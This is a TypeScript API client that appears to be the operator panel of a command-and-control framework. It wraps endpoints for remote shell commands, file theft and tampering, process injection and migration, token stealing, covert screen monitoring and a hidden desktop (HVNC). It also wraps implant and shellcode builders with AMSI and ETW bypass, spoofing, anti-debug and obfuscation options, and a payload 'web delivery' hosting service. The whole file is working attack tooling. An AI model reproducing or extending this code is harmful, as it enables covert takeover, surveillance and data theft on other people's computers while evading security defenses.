import type {LocationQueryValue} from "vue-router";
import type {UnwrapRef} from "vue";
import request from '@/utils/request'

import pinia from '@/stores/index';
// import {useAxiosConfigStore} from '@/stores/server';
// const axiosConfig = useAxiosConfigStore(pinia);

export default {
    get_clients_list(data: { page: number; page_size: number}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/clientslist",
            method: 'get',
            params: data,
        })
    },
    // 向后端发送命令请求
    send_commands(data: { uid: string | LocationQueryValue[], command: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/shell/sendcommand",
            method:'post',
            data:data
        })
    },
    get_shellcontent(data:{uid: string | LocationQueryValue[]}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/shell/getshellcontent",
            method: "get",
            params:data,
        })
    },
    get_graph_data(){
        return request({
            url:"/graph/data",
            method:"get",
        })
    },
    get_pid_list(data: { uid: string | null | LocationQueryValue[] }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/pid",
            method:"get",
            params:data,
        })
    },
    kill_pid(data: { uid: string | null | LocationQueryValue[]; pid: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/pid/kill",
            method:"post",
            data:data,
        })
    },
    get_file_tree(data: { uid: string | LocationQueryValue[], dirPath:string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/tree",
            method:"post",
            data:data,
        })
    },
    // 递归文件搜索(结果复用 file/tree 的树格式)
    search_files(data: { uid: string | LocationQueryValue[], dirPath: string, keyword: string, maxResults?: number }){
        return request({
            url:"/client/file/search",
            method:"post",
            data:data,
        })
    },
    delete_file(data: { uid: string | LocationQueryValue[], filePath: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/delete",
            method:"post",
            data:data,
        })
    },
    make_dir(data: { uid: string | LocationQueryValue[], dirPath: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/mkdir",
            method:"post",
            data:data,
        })
    },
    create_file(data: { uid: string | LocationQueryValue[], filePath: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/create",
            method:"post",
            data:data,
        })
    },
    upload_file(data: { uid: string | LocationQueryValue[]; file: File; uploadPath: string }){
        const formData = new FormData();

        // 添加文件和其他数据到 FormData 中
        formData.append("file", data.file);
        formData.append("uid", data.uid as string); // 转换为字符串以确保正确传递
        formData.append("uploadPath", data.uploadPath as string); // 新增的参数

        return request({
      //      baseURL: axiosConfig.baseURL,
            url: "/client/file/upload",
            method: "post",
            timeout: 600 * 1000, // 上传需等待客户端全部分块确认，超时放宽到10分钟
            headers: {
                "Content-Type": "multipart/form-data"
            },
            data: formData,
        });
    },
    get_note(data: { uid: string | LocationQueryValue[] }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/note/get",
            method:"get",
            params:data,
        })
    },
    save_note(data: { uid: string | LocationQueryValue[], noteContent: UnwrapRef<string> }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/note/save",
            method:"post",
            data:data,
        })
    },
    download_file(data: { uid: string | LocationQueryValue[], filePath:string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/download",
            method:"post",
            data:data,
        })
    },
    download_downloaded_file(data: { uid: string | null | LocationQueryValue[]; filePath: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/downloads/downloaded_file",
            method:"post",
            responseType: 'blob',
            data:data
        })
    },
    get_downloads_info(data: { uid: string | null | LocationQueryValue[] }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/downloads/info",
            method:"get",
            params:data
        })
    },
    delete_downloaded_file(data: { uid: string | null | LocationQueryValue[], filePath: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/downloads/delete",
            method:"delete",
            data:data
        })
    },
    get_drives(data:{uid:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/drives",
            method:"get",
            params:data
        })
    },
    fetch_file_content(data:{uid:string,path:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/edit/read",
            method:"POST",
            timeout: 120 * 1000, // 设置文件内容读取超时为120秒
            data:{
                uid: data.uid,
                filePath: data.path
            }
        })
    },
    save_file_content(data:{uid:string,path:string,content:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/edit/write",
            method:"POST",
            timeout: 120 * 1000, // 设置文件保存超时为120秒
            data:{
                uid: data.uid,
                filePath: data.path,
                content: data.content
            }
        })
    },
    modify_file_time(data:{uid:string,filePath:string,newTime:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/modifytime",
            method:"POST",
            data:data
        })
    },
    hide_file(data:{uid:string,filePath:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/hide",
            method:"POST",
            data:data
        })
    },
    unhide_file(data:{uid:string,filePath:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/unhide",
            method:"POST",
            data:data
        })
    },
    rename_file(data:{uid:string,oldPath:string,newPath:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/rename",
            method:"POST",
            data:data
        })
    },
    copy_file(data:{uid:string,oldPath:string,newPath:string}){
        return request({
            url:"/client/file/copy",
            method:"POST",
            data:data
        })
    },
    do_exit(data:{uid:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/exit",
            method:"GET",
            params:data,
        })
    },
    // 断开连接（发送 exit 命令，保留客户端记录）
    disconnect_client(data:{uid:string}){
        return request({
            url:"/client/disconnect",
            method:"GET",
            params:data,
        })
    },
    add_uid_note(data:{uid:string,note:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/addnote",
            method:"POST",
            data:data
        })
    },
    edit_sleep(data:{uid:string,sleep:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/sleep",
            method:"post",
            data:data,
        })
    },
    select_color(data:{uid:string,color:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/color",
            method:"post",
            data:data,
        })
    },
    // 内存注入（纯内存通道：shellcode 经命令通道下发，不落盘）
    // 单会话任务队列可视化(命令下发时间线)
    get_client_task_queue(uid: string){
        return request({
            url: `/client/tasks/${uid}`,
            method: "get",
        })
    },

    inject_mem(data: { uid: string; pid: string; tech: string; file: File }){
        const formData = new FormData();
        formData.append("uid", data.uid);
        formData.append("pid", data.pid);
        formData.append("tech", data.tech);
        formData.append("file", data.file);
        return request({
            url: "/client/inject-mem",
            method: "post",
            data: formData
        })
    },
    // 进程迁移(重上线式): 服务端按会话监听器配置自动重建 beacon→donut→注入→原进程退出
    migrate(data: { uid: string; pid: number; tech?: string }){
        return request({
            url: "/client/migrate",
            method: "post",
            data
        })
    },

    GenServer(data: {
      osType: string, archType: string, listener: string, pass: string,
      vkey?: string, encryptSalt?: string, format?: string, frontHost?: string,
      // OPSEC 编译期配置(可选,后端 GenServer 支持)
      reconnectBaseDelay?: string, reconnectMaxRetries?: string, injectTech?: string,
      masqueradeName?: string, quietMode?: string, etwPatch?: string, amsiBypass?: string,
      syscallMode?: string, autoDelete?: string, userAgent?: string, profileName?: string,
      // P0–P3 对抗能力的细分开关（见 docs/OPSEC.md §8 开关矩阵）
      sleepMaskHide?: string, stackSpoof?: string, ppidSpoof?: string, blockDLLs?: string,
      unhookOnStart?: string,
      // 多传输端点列表（scheme://addr,...）：非空时后端使用 multi 模板
      endpoints?: string,
    }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/GenServer",
            method:"post",
            responseType: 'blob',
            data:data
        })
    },
    ShowListener(){
        return request({
            url:"/client/listener/list",
            method:"GET"
        })
    },
    ShowListenerDetails(){
        return request({
            url:"/client/listener/details",
            method:"GET"
        })
    },
    GetWebDeliveryList(){
      return request({
          url:"/webdelivery/list",
          method:"GET"
      })
    },
    // Delivery Hub：支持 shared/dedicated + 伪装/防护字段
    StartWebDelivery(data: {
      listener: string
      os: string
      arch: string
      port?: string
      filename?: string
      pass?: string
      format?: string
      downloadPath?: string
      saveFilename?: string
      bindMode?: 'shared' | 'dedicated'
      publicHost?: string
      publicScheme?: string
      basePath?: string
      uriPath?: string
      contentType?: string
      stageContentType?: string
      accessToken?: string
      uaAllow?: string
      maxDownloads?: number
      oneTime?: boolean
      buildStager?: boolean
      note?: string
    }){
        return request({
            url:"/webdelivery/start",
            method:"POST",
            data:data
        })
    },
    OpenWebDelivery(data:{port?: string, publicKey?: string, id?: number}){
        return request({
            url:"/webdelivery/open",
            method:"POST",
            data:data
        })
    },
    CloseWebDelivery(data:{port?: string, publicKey?: string, id?: number}){
        return request({
            url:"/webdelivery/close",
            method:"POST",
            data:data
        })
    },
    DeleteWebDelivery(data:{port?: string, publicKey?: string, id?: number}){
        return request({
            url:"/webdelivery/delete",
            method:"POST",
            data:data
        })
    },
    // StagerToken 门禁令牌（防盗门）：生成带配额令牌 / 列表 / 删除
    CreateStagerToken(data: { public_key: string, quota?: number, note?: string }) {
        return request({
            url: "/webdelivery/token/create",
            method: "POST",
            data: data
        })
    },
    ListStagerTokens(params: { public_key: string }) {
        return request({
            url: "/webdelivery/token/list",
            method: "GET",
            params
        })
    },
    DeleteStagerToken(data: { id: number }) {
        return request({
            url: "/webdelivery/token/delete",
            method: "POST",
            data: data
        })
    },
    GetDeliveryCommands(params: { id?: number|string, port?: string, publicKey?: string }){
        return request({
            url: "/webdelivery/commands",
            method: "GET",
            params
        })
    },
    GetDeliveryAccessLogs(params: { id?: number|string, publicKey?: string, limit?: number }){
        return request({
            url: "/webdelivery/logs",
            method: "GET",
            params
        })
    },
    GetDeliveryDefaults(){
        return request({
            url: "/webdelivery/defaults",
            method: "GET"
        })
    },
    PreviewDeliveryURLs(data: {
      listener?: string
      os?: string
      filename?: string
      bindMode?: string
      port?: string
      publicHost?: string
      publicScheme?: string
      basePath?: string
      uriPath?: string
      publicKey?: string
    }){
        // 【断链修复】原误指 /client/batch-command(批量下发命令接口,功能坏+越权),
        // 正确路由为 /webdelivery/preview-urls
        return request({
            url: "/webdelivery/preview-urls",
            method: "POST",
            data
        })
    },

    // 窃取进程令牌(复用命令通道,后端 steal_token 前缀已注册;与右键菜单
    // sendCmd('steal_token '+pid) 行为一致,响应契约同为 {status:200,data:""})
    steal_token(data: { uid: string; pid: string }) {
        return this.send_commands({ uid: data.uid, command: `steal_token ${data.pid}` })
    },

    // 文件托管: 上传任意文件经 Delivery Hub /d/ 通道对外分发
    host_file(data: { file: File; contentType?: string; uriPath?: string; oneTime?: string; maxDownloads?: string; note?: string }) {
        const formData = new FormData()
        formData.append("file", data.file)
        if (data.contentType) formData.append("contentType", data.contentType)
        if (data.uriPath) formData.append("uriPath", data.uriPath)
        if (data.oneTime) formData.append("oneTime", data.oneTime)
        if (data.maxDownloads) formData.append("maxDownloads", data.maxDownloads)
        if (data.note) formData.append("note", data.note)
        return request({
            url: "/webdelivery/host-file",
            method: "POST",
            data: formData
        })
    },
    
    // 以下是别名方法，映射到现有API
    exit_client(data: { uid: string }) {
        return this.do_exit(data)
    },
    
    update_note(data: { uid: string, note: string }) {
        return this.add_uid_note(data)
    },
    
    update_sleep(data: { uid: string, sleep: string }) {
        return this.edit_sleep(data)
    },
    
    // 截图功能（quality: 0=低 1=中 2=高）
    take_screenshot(data: { uid: string, quality?: number }) {
        return request({
            url: "/client/screenshot1",
            method: "POST",
            data: data,
            timeout: 35000  // 设置35秒超时，比服务端30秒多5秒
        })
    },

    // ================ 屏幕监控功能 ================
    
    // 开始屏幕监控
    start_screen_monitor(data: { uid: string, frameRate: number }) {
        return request({
            url: "/client/monitor/start",
            method: "POST",
            data: data
        })
    },
    
    // 停止屏幕监控
    stop_screen_monitor(data: { uid: string }) {
        return request({
            url: "/client/monitor/stop",
            method: "POST",
            data: data
        })
    },
    
    // 获取监控帧数据
    get_monitor_frame(data: { uid: string }) {
        return request({
            url: "/client/monitor/frame",
            method: "GET",
            params: data,
            timeout: 35000  // 35秒超时，比服务端30秒多5秒
        })
    },

    // ===== HVNC 隐藏桌面 =====
    // 启动 HVNC 会话
    start_hvnc(data: { uid: string, app?: string, args?: string }) {
        return request({
            url: "/client/hvnc/start",
            method: "POST",
            data
        })
    },
    // 停止 HVNC 会话
    stop_hvnc(data: { uid: string, sid: string }) {
        return request({
            url: "/client/hvnc/stop",
            method: "POST",
            data
        })
    },
    // 下发 HVNC 输入事件
    send_hvnc_input(data: { uid: string, sid: string, data: string }) {
        return request({
            url: "/client/hvnc/input",
            method: "POST",
            data
        })
    },
    // 轮询获取 HVNC 帧（WS 不可用兜底）
    get_hvnc_frame(data: { uid: string, sid: string }) {
        return request({
            url: "/client/hvnc/frame",
            method: "GET",
            params: data,
            timeout: 35000
        })
    },

    // 批量删除客户端
    batch_delete_clients(data: { uids: string[] }) {
        return request({
            url: "/client/batch-delete",
            method: "POST",
            data: data
        })
    },

    // C14: 批量下发命令
    batch_command(data: { uids: string[], command: string }) {
        return request({
            url: "/client/batch-command",
            method: "POST",
            data: data
        })
    },

    // C14: 设置客户端分组
    update_client_group(data: { uid: string, group: string }) {
        return request({
            url: "/client/update-group",
            method: "POST",
            data: data
        })
    },

    // C14: 批量设置客户端分组（单次请求）
    batch_update_client_group(data: { uids: string[], group: string }) {
        return request({
            url: "/client/batch-update-group",
            method: "POST",
            data: data
        })
    },

    // 智能离线检测
    smart_offline_check(data: { uid: string }) {
        return request({
            url: "/client/smart-offline-check",
            method: "POST",
            data: data
        })
    },

    // 重置客户端ID自增序列
    reset_client_id() {
        return request({
            url: "/client/reset-id",
            method: "POST",
            data: {}
        })
    },

    // 批量任务列表（C14）
    list_tasks() {
        return request({
            url: "/client/tasks",
            method: "GET"
        })
    },

    // 客户端操作报告（C15）
    get_client_report(uid: string) {
        return request({
            url: "/client/report/" + uid,
            method: "GET"
        })
    },

    // 下载会话录像（C15）
    download_session_log(uid: string, filename: string) {
        return request({
            url: "/client/session-log?uid=" + uid + "&file=" + encodeURIComponent(filename),
            method: "GET",
            responseType: "blob"
        })
    },

    // ================ 正向连接功能 ================
    
    // 正向连接客户端
    connect_forward_client(data: {
        isEbpfClient: boolean
        connectionMethod: string
        ipAddress: string
        port: string
        password: string
        vkey?: string
        encryptionSalt?: string
    }) {
        return request({
            url: "/client/forward-connect",
            method: "POST",
            data: data
        })
    },

    // ================ Shellcode生成功能 ================
    
    // 传统Stage Shellcode生成
    StageShellCodeGen(data:{listener:string,port:string,format:string}){
        return request({
            url:"/shellcode/stage",
            method:"POST",
            data:data,
            responseType: 'blob',
        })
    },
    
    // 动态stager生成
    DynamicStageShellCodeGen(data:{
        listener: string;
        port: string;
        format: string; // 'exe' | 'elf' | 'bin' | 'hex' | 'c'
        anti_debug: boolean;
        obfuscation: boolean;
        user_agent: string;
        lightweight: boolean; // 轻量模式
    }){
        return request({
            url:"/shellcode/dynamic-stager",
            method:"POST",
            data:data,
            responseType: 'blob',
        })
    },
    
    // 获取stager构建信息
    GetStagerBuildInfo(port: string){
        return request({
            url:"/shellcode/stager-info",
            method:"GET",
            params: { port }
        })
    },

    // 快捷发送命令
    sendCmd(uid: string, command: string) {
        return this.send_commands({ uid, command })
    },

    // 设置客户端颜色
    setClientColor(uid: string, color: string) {
        return request({
            url: "/client/color",
            method: "POST",
            data: { uid, color }
        }).catch(() => {})
    },

    // 删除客户端会话（后端无 /client/delete，对齐 /client/batch-delete 单元素契约）
    deleteClient(uid: string) {
        return this.batch_delete_clients({ uids: [uid] }).catch(() => {})
    },

    // 内存执行（execute-assembly / inline-bin / shellcode-inject / bof / script / binary / exec-file）
    execute_bin(uid: string, file: File, args: string, mode: string) {
        const formData = new FormData()
        formData.append('file', file)
        formData.append('uid', uid)
        formData.append('args', args)
        formData.append('mode', mode)
        return request({
            url: "/bin/execute",
            method: "POST",
            timeout: 120 * 1000, // 100MB 上限，放宽到 2 分钟
            headers: {
                "Content-Type": "multipart/form-data"
            },
            data: formData,
        })
    }

}
